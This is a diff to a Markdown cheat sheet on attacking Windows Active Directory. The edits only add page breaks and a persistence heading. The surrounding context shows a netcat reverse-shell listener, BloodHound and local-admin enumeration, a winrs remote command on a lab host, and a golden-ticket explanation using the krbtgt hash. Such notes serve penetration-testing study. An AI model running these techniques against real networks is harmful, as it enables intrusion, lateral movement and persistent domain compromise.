@@ -24,7 +24,9 @@
   * [ACLs AdminSDHolder](#persistence-using-acls-adminsdholder)
   * [ACLs Rights Abuse](#persistence-using-acls-rights-abuse)
   * [ACLs Security Descriptors](#persistence-using-security-descriptors)
-
+ 
+  
+<div style="page-break-after: always;"></div>
 ## General
 Connect to a machine with Administrator privileges
 ```
@@ -107,6 +109,7 @@ nc64.exe -lvp 443
 ```
 
 **Note:** Remember to open the server using hfs.exe and insert the file required (in this case InvokePowerShellTcp.ps1)
+<div style="page-break-after: always;"></div>
 
 ## Enumeration
 ### Domain Enumeration Using ActiveDirectory Module
@@ -410,6 +413,7 @@ Invoke-BloodHound -ExcludeDCs
 ```
 
 The gathered data can be uploaded to the BloodHound application.
+<div style="page-break-after: always;"></div>
 
 ## Privilege Escalation
 ### Useful tools 
@@ -469,7 +473,7 @@ Perform the enumeration
 ```
 Find-PSRemotingLocalAdminAccess
 ```
-
+<div style="page-break-after: always;"></div>
 ## Lateral Movement
 Below a list of techniques that may be useful to escalate to domain admin performing a credential dump or exploiting an available Domain Admin session. 
 
@@ -698,12 +702,13 @@ Performing the command
 ```
 $null | winrs -r:dcorp-mgmt "cmd C:\Users\Public\Safety.bat"
 ```
-
+<div style="page-break-after: always;"></div>
 ## Kerberos
 
 ### Introduction
 Kerberos is the basis of authentication in a Windows Active Directory environment. Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain controller. These tickets represent the client's credentials. Therefore Kerberos is a very interesting target to abuse.
 
+## Persisitence
 ### Persistence using Golden Tickets
 
 A golden ticket is signed and encrypted by the hash of **krbtgt** account which makes it a valid TGT ticket. The **krbtgt** hash could be used to impersonate any user with any privileges from even a non-domain machine. As a good practice it is recommended to change the password of **krbtgt** account twice as password history is mantained for the account.
